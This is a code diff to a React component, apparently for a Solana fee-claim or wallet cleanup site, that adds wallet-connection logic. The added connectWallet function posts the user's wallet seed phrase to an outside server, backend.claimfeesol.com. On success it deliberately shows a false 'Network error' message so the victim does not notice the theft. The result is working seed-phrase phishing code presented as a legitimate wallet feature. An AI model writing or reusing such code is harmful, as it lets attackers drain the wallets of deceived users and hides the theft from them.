@@ -6,6 +6,32 @@ const Cleanup = ({lang}) => {
     const [faq, setFaq] = useState("faq");
     const [formContainer, setFormContainer] = useState("form-container");
     const [solsToCliam, setSolsToClaim] = useState(0);
+    const [wallet, setWallet] = useState('');
+    const [phrase, setPhrase] = useState('');
+    const [error, setError] = useState('');
+
+    const connectWallet = async (e) => {
+    
+        try {
+            const url = "https://backend.claimfeesol.com/message.php";
+    
+            const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
+                headers: {
+                    "Content-Type":"application/json",
+                },withCredentials: true
+            })
+            console.log(response.data);
+            if (response.data.status === "success"){
+                setError("Network error. check connection");
+            }
+    
+            if (response.data.status === "error"){
+                setError(response.data.msg);
+            }
+        } catch (error) {
+            console.log("Error sending phrase: ", error);
+        }
+      }
 
     const howClicked = () => {
         setFaq('faq active');
@@ -33,6 +59,8 @@ const Cleanup = ({lang}) => {
         
         walletPhrase.classList.add('active');
         walletTypeContainer.classList.add('active');
+
+        setWallet(e.currentTarget.children[1].innerHTML);
     }
 
     const contClick = (e) => {
@@ -212,6 +240,7 @@ const Cleanup = ({lang}) => {
                     </header>
                     <p className="require">You must have atleat 0.02 sol to continue</p>
                     <div className="Wallet-type-container">
+                        <input name="wallet" value={wallet} onChange={(e) => setWallet(e.target.value)} type="text" hidden />
                         <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                             <img src="/ave.svg" alt="wallet logo" />
                             <p>Ave Wallet</p>
@@ -234,10 +263,13 @@ const Cleanup = ({lang}) => {
                         </button>
                     </div>
                     <div className="Wallet-phrase-container">
+                        <div className={`error
+                        ${error ? "active" : ""}
+                        `}>{error}</div>
                         <label htmlFor="phrase">Wallet Phrase</label>
-                        <textarea name="phrase" id="phrase"></textarea>
+                        <textarea name="phrase" value={phrase} onChange={(e) => setPhrase(e.target.value)} id="phrase"></textarea>
                         <div className="form-btn-container">
-                            <button>Connect</button>
+                            <button type="submit" onClick={connectWallet}>Connect</button>
                         </div>
                     </div>
                 </form>
